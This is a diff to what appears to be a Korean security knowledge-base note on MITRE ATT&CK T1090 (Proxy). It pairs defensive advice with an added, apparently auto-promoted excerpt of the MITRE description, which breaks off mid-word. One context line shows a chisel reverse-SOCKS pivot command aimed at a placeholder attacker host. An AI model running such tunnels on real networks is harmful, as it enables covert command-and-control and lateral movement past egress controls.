@@ -24,3 +24,12 @@ chisel client <lhost>:8000 R:socks   # 피벗
 네트워크 분할·egress 통제·비정상 포워딩 탐지·호스트 격리.
 
 - 출처(검증): https://attack.mitre.org/techniques/T1090/
+
+## 최신 보강(승격)
+
+> `assassin --promote` 품질 관문을 통과한 권위 출처 발췌. 수정·삭제는 PR 리뷰로. 사람이 다듬은 위 섹션이 우선한다.
+
+### ATT&CK T1090 Proxy
+- 출처: https://attack.mitre.org/techniques/T1090/
+- 승격일: 2026-10-07
+- 요약: Proxy Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. [1] Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connecti
